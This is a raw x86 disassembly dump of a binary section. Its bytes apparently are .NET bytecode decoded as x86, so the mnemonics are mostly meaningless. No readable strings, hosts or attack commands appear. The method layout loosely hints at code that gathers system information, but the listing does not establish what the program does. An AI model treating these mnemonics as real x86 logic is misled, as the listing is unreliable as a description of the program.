  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	0a 28                	or     (%eax),%ch
  4036b5:	7a 00                	jp     0x4036b7
  4036b7:	00 0a                	add    %cl,(%edx)
  4036b9:	8c 68 00             	mov    %gs,0x0(%eax)
  4036bc:	00 01                	add    %al,(%ecx)
  4036be:	a2 28 8c 00 00       	mov    %al,0x8c28
  4036c3:	0a 28                	or     (%eax),%ch
  4036c5:	2e 00 00             	add    %al,%cs:(%eax)
  4036c8:	06                   	push   %es
  4036c9:	0a dd                	or     %ch,%bl
  4036cb:	0c 00                	or     $0x0,%al
  4036cd:	00 00                	add    %al,(%eax)
  4036cf:	26 72 d6             	es jb  0x4036a8
  4036d2:	23 00                	and    (%eax),%eax
  4036d4:	70 0a                	jo     0x4036e0
  4036d6:	dd 00                	fldl   (%eax)
  4036d8:	00 00                	add    %al,(%eax)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	2a 00                	sub    (%eax),%al
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	01 10                	add    %edx,(%eax)
  4036e2:	00 00                	add    %al,(%eax)
  4036e4:	00 00                	add    %al,(%eax)
  4036e6:	00 00                	add    %al,(%eax)
  4036e8:	57                   	push   %edi
  4036e9:	57                   	push   %edi
  4036ea:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  4036ed:	00 00                	add    %al,(%eax)
  4036ef:	01 13                	add    %edx,(%ebx)
  4036f1:	30 03                	xor    %al,(%ebx)
  4036f3:	00 5d 00             	add    %bl,0x0(%ebp)
  4036f6:	00 00                	add    %al,(%eax)
  4036f8:	0c 00                	or     $0x0,%al
  4036fa:	00 11                	add    %dl,(%ecx)
  4036fc:	73 8d                	jae    0x40368b
  4036fe:	00 00                	add    %al,(%eax)
  403700:	0a 28                	or     (%eax),%ch
  403702:	8e 00                	mov    (%eax),%es
  403704:	00 0a                	add    %cl,(%edx)
  403706:	02 6f 1f             	add    0x1f(%edi),%ch
  403709:	00 00                	add    %al,(%eax)
  40370b:	0a 0a                	or     (%edx),%cl
  40370d:	06                   	push   %es
  40370e:	6f                   	outsl  %ds:(%esi),(%dx)
  40370f:	8f 00                	pop    (%eax)
  403711:	00 0a                	add    %cl,(%edx)
  403713:	0a 73 90             	or     -0x70(%ebx),%dh
  403716:	00 00                	add    %al,(%eax)
  403718:	0a 0b                	or     (%ebx),%cl
  40371a:	06                   	push   %es
  40371b:	0c 16                	or     $0x16,%al
  40371d:	0d 38 1c 00 00       	or     $0x1c38,%eax
  403722:	00 08                	add    %cl,(%eax)
  403724:	09 91 13 04 07 12    	or     %edx,0x12070413(%ecx)
  40372a:	04 72                	add    $0x72,%al
  40372c:	e8 23 00 70 28       	call   0x28b03754
  403731:	91                   	xchg   %eax,%ecx
  403732:	00 00                	add    %al,(%eax)
  403734:	0a 6f 92             	or     -0x6e(%edi),%ch
  403737:	00 00                	add    %al,(%eax)
  403739:	0a 26                	or     (%esi),%ah
  40373b:	09 17                	or     %edx,(%edi)
  40373d:	58                   	pop    %eax
  40373e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  403743:	32 de                	xor    %dh,%bl
  403745:	07                   	pop    %es
  403746:	6f                   	outsl  %ds:(%esi),(%dx)
  403747:	38 00                	cmp    %al,(%eax)
  403749:	00 0a                	add    %cl,(%edx)
  40374b:	16                   	push   %ss
  40374c:	1f                   	pop    %ds
  40374d:	14 6f                	adc    $0x6f,%al
  40374f:	93                   	xchg   %eax,%ebx
  403750:	00 00                	add    %al,(%eax)
  403752:	0a 6f 94             	or     -0x6c(%edi),%ch
  403755:	00 00                	add    %al,(%eax)
  403757:	0a 2a                	or     (%edx),%ch
  403759:	00 00                	add    %al,(%eax)
  40375b:	00 13                	add    %dl,(%ebx)
  40375d:	30 07                	xor    %al,(%edi)
  40375f:	00 b0 01 00 00 0d    	add    %dh,0xd000001(%eax)
  403765:	00 00                	add    %al,(%eax)
  403767:	11 73 94             	adc    %esi,-0x6c(%ebx)
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	25 72 52 21 00       	and    $0x215272,%eax
  403772:	70 6f                	jo     0x4037e3
  403774:	7f 00                	jg     0x403776
  403776:	00 06                	add    %al,(%esi)
  403778:	72 ee                	jb     0x403768
  40377a:	23 00                	and    (%eax),%eax
  40377c:	70 6f                	jo     0x4037ed
  40377e:	8c 00                	mov    %es,(%eax)
  403780:	00 06                	add    %al,(%esi)
  403782:	25 72 04 24 00       	and    $0x240472,%eax
  403787:	70 6f                	jo     0x4037f8
  403789:	7f 00                	jg     0x40378b
  40378b:	00 06                	add    %al,(%esi)
  40378d:	7e 10                	jle    0x40379f
  40378f:	00 00                	add    %al,(%eax)
  403791:	04 6f                	add    $0x6f,%al
  403793:	8c 00                	mov    %es,(%eax)
  403795:	00 06                	add    %al,(%esi)
  403797:	25 72 0e 24 00       	and    $0x240e72,%eax
  40379c:	70 6f                	jo     0x40380d
  40379e:	7f 00                	jg     0x4037a0
  4037a0:	00 06                	add    %al,(%esi)
  4037a2:	28 89 00 00 0a 6f    	sub    %cl,0x6f0a0000(%ecx)
  4037a8:	38 00                	cmp    %al,(%eax)
  4037aa:	00 0a                	add    %cl,(%edx)
  4037ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4037ad:	8c 00                	mov    %es,(%eax)
  4037af:	00 06                	add    %al,(%esi)
  4037b1:	25 72 18 24 00       	and    $0x241872,%eax
  4037b6:	70 6f                	jo     0x403827
  4037b8:	7f 00                	jg     0x4037ba
  4037ba:	00 06                	add    %al,(%esi)
  4037bc:	73 7b                	jae    0x403839
  4037be:	00 00                	add    %al,(%eax)
  4037c0:	0a 28                	or     (%eax),%ch
  4037c2:	7c 00                	jl     0x4037c4
  4037c4:	00 0a                	add    %cl,(%edx)
  4037c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4037c7:	38 00                	cmp    %al,(%eax)
  4037c9:	00 0a                	add    %cl,(%edx)
  4037cb:	72 1e                	jb     0x4037eb
  4037cd:	24 00                	and    $0x0,%al
  4037cf:	70 14                	jo     0x4037e5
  4037d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4037d2:	95                   	xchg   %eax,%ebp
  4037d3:	00 00                	add    %al,(%eax)
  4037d5:	0a 72 32             	or     0x32(%edx),%dh
  4037d8:	24 00                	and    $0x0,%al
  4037da:	70 28                	jo     0x403804
  4037dc:	96                   	xchg   %eax,%esi
  4037dd:	00 00                	add    %al,(%eax)
  4037df:	0a 0a                	or     (%edx),%cl
  4037e1:	12 00                	adc    (%eax),%al
  4037e3:	28 97 00 00 0a 72    	sub    %dl,0x720a0000(%edi)
  4037e9:	36 24 00             	ss and $0x0,%al
  4037ec:	70 72                	jo     0x403860
  4037ee:	40                   	inc    %eax
  4037ef:	24 00                	and    $0x0,%al
  4037f1:	70 6f                	jo     0x403862
  4037f3:	95                   	xchg   %eax,%ebp
  4037f4:	00 00                	add    %al,(%eax)
  4037f6:	0a 72 4c             	or     0x4c(%edx),%dh
  4037f9:	24 00                	and    $0x0,%al
  4037fb:	70 72                	jo     0x40386f
  4037fd:	58                   	pop    %eax
  4037fe:	24 00                	and    $0x0,%al
  403800:	70 6f                	jo     0x403871
  403802:	95                   	xchg   %eax,%ebp
  403803:	00 00                	add    %al,(%eax)
  403805:	0a 28                	or     (%eax),%ch
  403807:	68 00 00 0a 6f       	push   $0x6f0a0000
  40380c:	8c 00                	mov    %es,(%eax)
  40380e:	00 06                	add    %al,(%esi)
  403810:	25 72 64 24 00       	and    $0x246472,%eax
  403815:	70 6f                	jo     0x403886
  403817:	7f 00                	jg     0x403819
  403819:	00 06                	add    %al,(%esi)
  40381b:	28 98 00 00 0a 6f    	sub    %bl,0x6f0a0000(%eax)
  403821:	8c 00                	mov    %es,(%eax)
  403823:	00 06                	add    %al,(%esi)
  403825:	25 72 6e 24 00       	and    $0x246e72,%eax
  40382a:	70 6f                	jo     0x40389b
  40382c:	7f 00                	jg     0x40382e
  40382e:	00 06                	add    %al,(%esi)
  403830:	7e 03                	jle    0x403835
  403832:	00 00                	add    %al,(%eax)
  403834:	04 6f                	add    $0x6f,%al
  403836:	8c 00                	mov    %es,(%eax)
  403838:	00 06                	add    %al,(%esi)
  40383a:	25 72 7e 24 00       	and    $0x247e72,%eax
  40383f:	70 6f                	jo     0x4038b0
  403841:	7f 00                	jg     0x403843
  403843:	00 06                	add    %al,(%esi)
  403845:	28 30                	sub    %dh,(%eax)
  403847:	00 00                	add    %al,(%eax)
  403849:	06                   	push   %es
  40384a:	0a 12                	or     (%edx),%dl
  40384c:	00 28                	add    %ch,(%eax)
  40384e:	97                   	xchg   %eax,%edi
  40384f:	00 00                	add    %al,(%eax)
  403851:	0a 6f 7d             	or     0x7d(%edi),%ch
  403854:	00 00                	add    %al,(%eax)
  403856:	0a 72 8a             	or     -0x76(%edx),%dh
  403859:	24 00                	and    $0x0,%al
  40385b:	70 72                	jo     0x4038cf
  40385d:	7e 24                	jle    0x403883
  40385f:	00 70 6f             	add    %dh,0x6f(%eax)
  403862:	95                   	xchg   %eax,%ebp
  403863:	00 00                	add    %al,(%eax)
  403865:	0a 72 94             	or     -0x6c(%edx),%dh
  403868:	24 00                	and    $0x0,%al
  40386a:	70 72                	jo     0x4038de
  40386c:	0e                   	push   %cs
  40386d:	24 00                	and    $0x0,%al
  40386f:	70 6f                	jo     0x4038e0
  403871:	95                   	xchg   %eax,%ebp
  403872:	00 00                	add    %al,(%eax)
  403874:	0a 6f 8c             	or     -0x74(%edi),%ch
  403877:	00 00                	add    %al,(%eax)
  403879:	06                   	push   %es
  40387a:	25 72 a0 24 00       	and    $0x24a072,%eax
  40387f:	70 6f                	jo     0x4038f0
  403881:	7f 00                	jg     0x403883
  403883:	00 06                	add    %al,(%esi)
  403885:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  40388b:	8c 00                	mov    %es,(%eax)
  40388d:	00 06                	add    %al,(%esi)
  40388f:	25 72 b8 24 00       	and    $0x24b872,%eax
  403894:	70 6f                	jo     0x403905
  403896:	7f 00                	jg     0x403898
  403898:	00 06                	add    %al,(%esi)
  40389a:	7e 0e                	jle    0x4038aa
  40389c:	00 00                	add    %al,(%eax)
  40389e:	04 6f                	add    $0x6f,%al
  4038a0:	8c 00                	mov    %es,(%eax)
  4038a2:	00 06                	add    %al,(%esi)
  4038a4:	25 72 ca 24 00       	and    $0x24ca72,%eax
  4038a9:	70 6f                	jo     0x40391a
  4038ab:	7f 00                	jg     0x4038ad
  4038ad:	00 06                	add    %al,(%esi)
  4038af:	28 32                	sub    %dh,(%edx)
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4038b5:	8c 00                	mov    %es,(%eax)
  4038b7:	00 06                	add    %al,(%esi)
  4038b9:	25 72 de 24 00       	and    $0x24de72,%eax
  4038be:	70 6f                	jo     0x40392f
  4038c0:	7f 00                	jg     0x4038c2
  4038c2:	00 06                	add    %al,(%esi)
  4038c4:	28 98 00 00 0a 73    	sub    %bl,0x730a0000(%eax)
  4038ca:	54                   	push   %esp
  4038cb:	00 00                	add    %al,(%eax)
  4038cd:	0a 28                	or     (%eax),%ch
  4038cf:	99                   	cltd
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 0b                	or     (%ebx),%cl
  4038d4:	12 01                	adc    (%ecx),%al
  4038d6:	28 9a 00 00 0a 0b    	sub    %bl,0xb0a0000(%edx)
  4038dc:	12 01                	adc    (%ecx),%al
  4038de:	28 9b 00 00 0a 6f    	sub    %bl,0x6f0a0000(%ebx)
  4038e4:	8c 00                	mov    %es,(%eax)
  4038e6:	00 06                	add    %al,(%esi)
  4038e8:	25 72 f2 24 00       	and    $0x24f272,%eax
  4038ed:	70 6f                	jo     0x40395e
  4038ef:	7f 00                	jg     0x4038f1
  4038f1:	00 06                	add    %al,(%esi)
  4038f3:	72 4c                	jb     0x403941
  4038f5:	21 00                	and    %eax,(%eax)
  4038f7:	70 6f                	jo     0x403968
  4038f9:	8c 00                	mov    %es,(%eax)
  4038fb:	00 06                	add    %al,(%esi)
  4038fd:	25 72 fc 24 00       	and    $0x24fc72,%eax
  403902:	70 6f                	jo     0x403973
  403904:	7f 00                	jg     0x403906
  403906:	00 06                	add    %al,(%esi)
  403908:	7e 12                	jle    0x40391c
  40390a:	00 00                	add    %al,(%eax)
  40390c:	04 6f                	add    $0x6f,%al
  40390e:	8c 00                	mov    %es,(%eax)
  403910:	00 06                	add    %al,(%esi)
  403912:	6f                   	outsl  %ds:(%esi),(%dx)
  403913:	89 00                	mov    %eax,(%eax)
  403915:	00 06                	add    %al,(%esi)
  403917:	2a 1b                	sub    (%ebx),%bl
  403919:	30 02                	xor    %al,(%edx)
  40391b:	00 5b 00             	add    %bl,0x0(%ebx)
  40391e:	00 00                	add    %al,(%eax)
  403920:	00 00                	add    %al,(%eax)
  403922:	00 00                	add    %al,(%eax)
  403924:	7e 0f                	jle    0x403935
  403926:	00 00                	add    %al,(%eax)
  403928:	04 28                	add    $0x28,%al
  40392a:	17                   	pop    %ss
  40392b:	00 00                	add    %al,(%eax)
  40392d:	0a 39                	or     (%ecx),%bh
  40392f:	0f 00 00             	sldt   (%eax)
  403932:	00 28                	add    %ch,(%eax)
  403934:	30 00                	xor    %al,(%eax)
  403936:	00 06                	add    %al,(%esi)
  403938:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  40393e:	40                   	inc    %eax
  40393f:	00 00                	add    %al,(%eax)
  403941:	06                   	push   %es
  403942:	28 37                	sub    %dh,(%edi)
  403944:	00 00                	add    %al,(%eax)
  403946:	06                   	push   %es
  403947:	28 08                	sub    %cl,(%eax)
  403949:	00 00                	add    %al,(%eax)
  40394b:	06                   	push   %es
  40394c:	25 3a 06 00 00       	and    $0x63a,%eax
  403951:	00 26                	add    %ah,(%esi)
  403953:	38 05 00 00 00 6f    	cmp    %al,0x6f000000
  403959:	9f                   	lahf
  40395a:	00 00                	add    %al,(%eax)
  40395c:	0a 28                	or     (%eax),%ch
  40395e:	06                   	push   %es
  40395f:	00 00                	add    %al,(%eax)
  403961:	06                   	push   %es
  403962:	25 3a 06 00 00       	and    $0x63a,%eax
  403967:	00 26                	add    %ah,(%esi)
  403969:	38 05 00 00 00 28    	cmp    %al,0x28000000
  40396f:	a0 00 00 0a dd       	mov    0xdd0a0000,%al
  403974:	06                   	push   %es
  403975:	00 00                	add    %al,(%eax)
  403977:	00 26                	add    %ah,(%esi)
  403979:	dd 00                	fldl   (%eax)
  40397b:	00 00                	add    %al,(%eax)
  40397d:	00 2a                	add    %ch,(%edx)
  40397f:	00 01                	add    %al,(%ecx)
  403981:	10 00                	adc    %al,(%eax)
  403983:	00 00                	add    %al,(%eax)
  403985:	00 00                	add    %al,(%eax)
  403987:	00 54 54 00          	add    %dl,0x0(%esp,%edx,2)
  40398b:	06                   	push   %es
  40398c:	01 00                	add    %eax,(%eax)
  40398e:	00 01                	add    %al,(%ecx)
  403990:	1b 30                	sbb    (%eax),%esi
  403992:	03 00                	add    (%eax),%eax
  403994:	b8 00 00 00 0e       	mov    $0xe000000,%eax
  403999:	00 00                	add    %al,(%eax)
  40399b:	11 72 08             	adc    %esi,0x8(%edx)
  40399e:	25 00 70 28 8a       	and    $0x8a287000,%eax
  4039a3:	00 00                	add    %al,(%eax)
  4039a5:	0a 72 0e             	or     0xe(%edx),%dh
  4039a8:	25 00 70 28 68       	and    $0x68287000,%eax
  4039ad:	00 00                	add    %al,(%eax)
  4039af:	0a 72 3a             	or     0x3a(%edx),%dh
  4039b2:	25 00 70 73 a1       	and    $0xa1737000,%eax
  4039b7:	00 00                	add    %al,(%eax)
  4039b9:	0a 0a                	or     (%edx),%cl
  4039bb:	73 a2                	jae    0x40395f
  4039bd:	00 00                	add    %al,(%eax)
  4039bf:	0a 0b                	or     (%ebx),%cl
  4039c1:	06                   	push   %es
  4039c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4039c3:	80 00 00             	addb   $0x0,(%eax)
  4039c6:	0a 6f 81             	or     -0x7f(%edi),%ch
  4039c9:	00 00                	add    %al,(%eax)
  4039cb:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4039ce:	1d 00 00 00 08       	sbb    $0x8000000,%eax
  4039d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4039d4:	82 00 00             	addb   $0x0,(%eax)
  4039d7:	0a 0d 07 09 72 78    	or     0x78720907,%cl
  4039dd:	25 00 70 6f 83       	and    $0x836f7000,%eax
  4039e2:	00 00                	add    %al,(%eax)
  4039e4:	0a 6f 38             	or     0x38(%edi),%ch
  4039e7:	00 00                	add    %al,(%eax)
  4039e9:	0a 6f a3             	or     -0x5d(%edi),%ch
  4039ec:	00 00                	add    %al,(%eax)
  4039ee:	0a 08                	or     (%eax),%cl
  4039f0:	6f                   	outsl  %ds:(%esi),(%dx)
  4039f1:	85 00                	test   %eax,(%eax)
  4039f3:	00 0a                	add    %cl,(%edx)
  4039f5:	2d db dd 0d 00       	sub    $0xddddb,%eax
  4039fa:	00 00                	add    %al,(%eax)
  4039fc:	08 39                	or     %bh,(%ecx)
  4039fe:	06                   	push   %es
  4039ff:	00 00                	add    %al,(%eax)
  403a01:	00 08                	add    %cl,(%eax)
  403a03:	6f                   	outsl  %ds:(%esi),(%dx)
  403a04:	33 00                	xor    (%eax),%eax
  403a06:	00 0a                	add    %cl,(%edx)
  403a08:	dc 07                	faddl  (%edi)
  403a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  403a0b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403a0c:	00 00                	add    %al,(%eax)
  403a0e:	0a 3a                	or     (%edx),%bh
  403a10:	0c 00                	or     $0x0,%al
  403a12:	00 00                	add    %al,(%eax)
  403a14:	72 90                	jb     0x4039a6
  403a16:	25 00 70 13 04       	and    $0x4137000,%eax
  403a1b:	dd 31                	fnsave (%ecx)
  403a1d:	00 00                	add    %al,(%eax)
  403a1f:	00 72 98             	add    %dh,-0x68(%edx)
  403a22:	25 00 70 07 6f       	and    $0x6f077000,%eax
  403a27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a28:	00 00                	add    %al,(%eax)
  403a2a:	0a 28                	or     (%eax),%ch
  403a2c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a2d:	00 00                	add    %al,(%eax)
  403a2f:	0a 13                	or     (%ebx),%dl
  403a31:	04 dd                	add    $0xdd,%al
  403a33:	1a 00                	sbb    (%eax),%al
  403a35:	00 00                	add    %al,(%eax)
  403a37:	06                   	push   %es
  403a38:	39 06                	cmp    %eax,(%esi)
  403a3a:	00 00                	add    %al,(%eax)
  403a3c:	00 06                	add    %al,(%esi)
  403a3e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a3f:	33 00                	xor    (%eax),%eax
  403a41:	00 0a                	add    %cl,(%edx)
  403a43:	dc 26                	fsubl  (%esi)
  403a45:	72 90                	jb     0x4039d7
  403a47:	25 00 70 13 04       	and    $0x4137000,%eax
  403a4c:	dd 00                	fldl   (%eax)
  403a4e:	00 00                	add    %al,(%eax)
  403a50:	00 11                	add    %dl,(%ecx)
  403a52:	04 2a                	add    $0x2a,%al
  403a54:	01 28                	add    %ebp,(%eax)
  403a56:	00 00                	add    %al,(%eax)
  403a58:	02 00                	add    (%eax),%al
  403a5a:	31 00                	xor    %eax,(%eax)
  403a5c:	2f                   	das
  403a5d:	60                   	pusha
  403a5e:	00 0d 00 00 00 00    	add    %cl,0x0
  403a64:	02 00                	add    (%eax),%al
  403a66:	1f                   	pop    %ds
  403a67:	00 7c 9b 00          	add    %bh,0x0(%ebx,%ebx,4)
  403a6b:	0d 00 00 00 00       	or     $0x0,%eax
  403a70:	00 00                	add    %al,(%eax)
  403a72:	00 00                	add    %al,(%eax)
  403a74:	a8 a8                	test   $0xa8,%al
  403a76:	00 0d 01 00 00 01    	add    %cl,0x1000001
  403a7c:	13 30                	adc    (%eax),%esi
  403a7e:	02 00                	add    (%eax),%al
  403a80:	39 00                	cmp    %eax,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	0f 00 00             	sldt   (%eax)
  403a87:	11 28                	adc    %ebp,(%eax)
  403a89:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	0a 0a                	or     (%edx),%cl
  403a8e:	16                   	push   %ss
  403a8f:	0b 38                	or     (%eax),%edi
  403a91:	24 00                	and    $0x0,%al
  403a93:	00 00                	add    %al,(%eax)
  403a95:	06                   	push   %es
  403a96:	07                   	pop    %es
  403a97:	a3 0a 00 00 01       	mov    %eax,0x100000a
  403a9c:	0c 08                	or     $0x8,%al
  403a9e:	6f                   	outsl  %ds:(%esi),(%dx)
  403a9f:	a8 00                	test   $0x0,%al
  403aa1:	00 0a                	add    %cl,(%edx)
  403aa3:	02 6f a9             	add    -0x57(%edi),%ch
  403aa6:	00 00                	add    %al,(%eax)
  403aa8:	0a 28                	or     (%eax),%ch
  403aaa:	aa                   	stos   %al,%es:(%edi)
  403aab:	00 00                	add    %al,(%eax)
  403aad:	0a 39                	or     (%ecx),%bh
  403aaf:	02 00                	add    (%eax),%al
  403ab1:	00 00                	add    %al,(%eax)
  403ab3:	08 2a                	or     %ch,(%edx)
  403ab5:	07                   	pop    %es
  403ab6:	17                   	pop    %ss
  403ab7:	58                   	pop    %eax
  403ab8:	0b 07                	or     (%edi),%eax
  403aba:	06                   	push   %es
  403abb:	8e 69 32             	mov    0x32(%ecx),%gs
  403abe:	d6                   	salc
  403abf:	14 2a                	adc    $0x2a,%al
  403ac1:	00 00                	add    %al,(%eax)
  403ac3:	00 1b                	add    %bl,(%ebx)
  403ac5:	30 01                	xor    %al,(%ecx)
  403ac7:	00 17                	add    %dl,(%edi)
  403ac9:	00 00                	add    %al,(%eax)
  403acb:	00 00                	add    %al,(%eax)
  403acd:	00 00                	add    %al,(%eax)
  403acf:	00 20                	add    %ah,(%eax)
  403ad1:	03 00                	add    (%eax),%eax
  403ad3:	00 80 28 3c 00 00    	add    %al,0x3c28(%eax)
  403ad9:	06                   	push   %es
  403ada:	26 dd 06             	fldl   %es:(%esi)
  403add:	00 00                	add    %al,(%eax)
  403adf:	00 26                	add    %ah,(%esi)
  403ae1:	dd 00                	fldl   (%eax)
  403ae3:	00 00                	add    %al,(%eax)
  403ae5:	00 2a                	add    %ch,(%edx)
  403ae7:	00 01                	add    %al,(%ecx)
  403ae9:	10 00                	adc    %al,(%eax)
  403aeb:	00 00                	add    %al,(%eax)
  403aed:	00 00                	add    %al,(%eax)
  403aef:	00 10                	add    %dl,(%eax)
  403af1:	10 00                	adc    %al,(%eax)
  403af3:	06                   	push   %es
  403af4:	01 00                	add    %eax,(%eax)
  403af6:	00 01                	add    %al,(%ecx)
  403af8:	1b 30                	sbb    (%eax),%esi
  403afa:	03 00                	add    (%eax),%eax
  403afc:	40                   	inc    %eax
  403afd:	00 00                	add    %al,(%eax)
  403aff:	00 10                	add    %dl,(%eax)
  403b01:	00 00                	add    %al,(%eax)
  403b03:	11 20                	adc    %esp,(%eax)
  403b05:	00 01                	add    %al,(%ecx)
  403b07:	00 00                	add    %al,(%eax)
  403b09:	73 ab                	jae    0x403ab6
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	0a 0a                	or     (%edx),%cl
  403b0f:	28 38                	sub    %bh,(%eax)
  403b11:	00 00                	add    %al,(%eax)
  403b13:	06                   	push   %es
  403b14:	06                   	push   %es
  403b15:	20 00                	and    %al,(%eax)
  403b17:	01 00                	add    %eax,(%eax)
  403b19:	00 28                	add    %ch,(%eax)
  403b1b:	39 00                	cmp    %eax,(%eax)
  403b1d:	00 06                	add    %al,(%esi)
  403b1f:	16                   	push   %ss
  403b20:	3e 0c 00             	ds or  $0x0,%al
  403b23:	00 00                	add    %al,(%eax)
  403b25:	06                   	push   %es
  403b26:	6f                   	outsl  %ds:(%esi),(%dx)
  403b27:	38 00                	cmp    %al,(%eax)
  403b29:	00 0a                	add    %cl,(%edx)
  403b2b:	0b dd                	or     %ebp,%ebx
  403b2d:	11 00                	adc    %eax,(%eax)
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	dd 06                	fldl   (%esi)
  403b33:	00 00                	add    %al,(%eax)
  403b35:	00 26                	add    %ah,(%esi)
  403b37:	dd 00                	fldl   (%eax)
  403b39:	00 00                	add    %al,(%eax)
  403b3b:	00 72 4c             	add    %dh,0x4c(%edx)
  403b3e:	21 00                	and    %eax,(%eax)
  403b40:	70 2a                	jo     0x403b6c
  403b42:	07                   	pop    %es
  403b43:	2a 01                	sub    (%ecx),%al
  403b45:	10 00                	adc    %al,(%eax)
  403b47:	00 00                	add    %al,(%eax)
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	00 32                	add    %dh,(%edx)
  403b4d:	32 00                	xor    (%eax),%al
  403b4f:	06                   	push   %es
  403b50:	01 00                	add    %eax,(%eax)
  403b52:	00 01                	add    %al,(%ecx)
  403b54:	13 30                	adc    (%eax),%esi
  403b56:	03 00                	add    (%eax),%eax
  403b58:	14 00                	adc    $0x0,%al
  403b5a:	00 00                	add    %al,(%eax)
  403b5c:	02 00                	add    (%eax),%al
  403b5e:	00 11                	add    %dl,(%ecx)
  403b60:	16                   	push   %ss
  403b61:	7e 08                	jle    0x403b6b
  403b63:	00 00                	add    %al,(%eax)
  403b65:	04 12                	add    $0x12,%al
  403b67:	00 73 ac             	add    %dh,-0x54(%ebx)
  403b6a:	00 00                	add    %al,(%eax)
  403b6c:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403b72:	06                   	push   %es
  403b73:	2a 1b                	sub    (%ebx),%bl
  403b75:	30 03                	xor    %al,(%ebx)
  403b77:	00 2a                	add    %ch,(%edx)
  403b79:	00 00                	add    %al,(%eax)
  403b7b:	00 00                	add    %al,(%eax)
  403b7d:	00 00                	add    %al,(%eax)
  403b7f:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403b82:	06                   	push   %es
  403b83:	3e 00 00             	add    %al,%ds:(%eax)
  403b86:	06                   	push   %es
  403b87:	73 ae                	jae    0x403b37
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	0a 28                	or     (%eax),%ch
  403b8d:	af                   	scas   %es:(%edi),%eax
  403b8e:	00 00                	add    %al,(%eax)
  403b90:	0a 28                	or     (%eax),%ch
  403b92:	b0 00                	mov    $0x0,%al
  403b94:	00 0a                	add    %cl,(%edx)
  403b96:	17                   	pop    %ss
  403b97:	16                   	push   %ss
  403b98:	16                   	push   %ss
  403b99:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403b9f:	06                   	push   %es
  403ba0:	00 00                	add    %al,(%eax)
  403ba2:	00 26                	add    %ah,(%esi)
  403ba4:	dd 00                	fldl   (%eax)
  403ba6:	00 00                	add    %al,(%eax)
  403ba8:	00 2a                	add    %ch,(%edx)
  403baa:	00 00                	add    %al,(%eax)
  403bac:	01 10                	add    %edx,(%eax)
  403bae:	00 00                	add    %al,(%eax)
  403bb0:	00 00                	add    %al,(%eax)
  403bb2:	00 00                	add    %al,(%eax)
  403bb4:	23 23                	and    (%ebx),%esp
  403bb6:	00 06                	add    %al,(%esi)
  403bb8:	01 00                	add    %eax,(%eax)
  403bba:	00 01                	add    %al,(%ecx)
  403bbc:	1b 30                	sbb    (%eax),%esi
  403bbe:	03 00                	add    (%eax),%eax
  403bc0:	1b 00                	sbb    (%eax),%eax
  403bc2:	00 00                	add    %al,(%eax)
  403bc4:	00 00                	add    %al,(%eax)
  403bc6:	00 00                	add    %al,(%eax)
  403bc8:	16                   	push   %ss
  403bc9:	16                   	push   %ss
  403bca:	16                   	push   %ss
  403bcb:	28 3d 00 00 06 dd    	sub    %bh,0xdd060000
  403bd1:	0d 00 00 00 26       	or     $0x26000000,%eax
  403bd6:	20 a0 86 01 00 28    	and    %ah,0x28000186(%eax)
  403bdc:	14 00                	adc    $0x0,%al
  403bde:	00 0a                	add    %cl,(%edx)
  403be0:	2b f4                	sub    %esp,%esi
  403be2:	2a 00                	sub    (%eax),%al
  403be4:	01 10                	add    %edx,(%eax)
  403be6:	00 00                	add    %al,(%eax)
  403be8:	00 00                	add    %al,(%eax)
  403bea:	00 00                	add    %al,(%eax)
  403bec:	0d 0d 00 0d 01       	or     $0x10d000d,%eax
  403bf1:	00 00                	add    %al,(%eax)
  403bf3:	01 1b                	add    %ebx,(%ebx)
  403bf5:	30 04 00             	xor    %al,(%eax,%eax,1)
  403bf8:	41                   	inc    %ecx
  403bf9:	00 00                	add    %al,(%eax)
  403bfb:	00 11                	add    %dl,(%ecx)
  403bfd:	00 00                	add    %al,(%eax)
  403bff:	11 7e 65             	adc    %edi,0x65(%esi)
  403c02:	00 00                	add    %al,(%eax)
  403c04:	0a 7e 23             	or     0x23(%esi),%bh
  403c07:	00 00                	add    %al,(%eax)
  403c09:	04 18                	add    $0x18,%al
  403c0b:	6f                   	outsl  %ds:(%esi),(%dx)
  403c0c:	b1 00                	mov    $0x0,%cl
  403c0e:	00 0a                	add    %cl,(%edx)
  403c10:	0a 06                	or     (%esi),%al
  403c12:	02 03                	add    (%ebx),%al
  403c14:	19 6f b2             	sbb    %ebp,-0x4e(%edi)
  403c17:	00 00                	add    %al,(%eax)
  403c19:	0a 17                	or     (%edi),%dl
  403c1b:	0b dd                	or     %ebp,%ebx
  403c1d:	1e                   	push   %ds
  403c1e:	00 00                	add    %al,(%eax)
  403c20:	00 06                	add    %al,(%esi)
  403c22:	39 06                	cmp    %eax,(%esi)
  403c24:	00 00                	add    %al,(%eax)
  403c26:	00 06                	add    %al,(%esi)
  403c28:	6f                   	outsl  %ds:(%esi),(%dx)
